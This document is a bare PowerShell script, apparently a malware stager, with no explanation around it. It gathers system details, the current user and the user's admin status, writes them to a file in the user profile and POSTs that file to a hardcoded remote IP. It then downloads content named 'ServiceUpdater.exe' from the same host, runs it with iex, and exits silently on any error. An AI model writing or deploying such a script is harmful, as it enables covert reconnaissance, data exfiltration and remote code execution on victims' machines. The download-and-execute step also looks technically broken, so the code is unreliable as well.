$remoteIp = "172.16.100.12"
$remotePort = 80

$fields = @(
"Host Name",
"OS Name",
"OS Version",
"OS Configuration",
"System Type",
"Registered Owner",
"BIOS Version",
"Domain",
"Logon Server"
)

try {

$sysinfo = systeminfo
$results = @()

foreach ($field in $fields){
    $results += ($sysinfo | Select-String $field).ToString()
}

$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$results += $currentUser

$isAdmin = (New-Object System.Security.Principal.WindowsPrincipal($currentUser)).
           IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)

$results += "Is Admin : $isAdmin"

$output = Join-Path $env:USERPROFILE "ciminfotxt"

$results | Out-File $output -Encoding UTF8

$response = Invoke-WebRequest -Uri "$remoteIp:$remotePort" `
           -Method POST `
           -InFile $output

$payloadId = $response.Content.Trim()

if ([string]::IsNullOrEmpty($payloadId)) { exit }

$x = (New-Object Net.WebClient).DownloadString(
     "http://$remoteIp:80/ServiceUpdater.exe"
)

iex $x

}
catch { exit }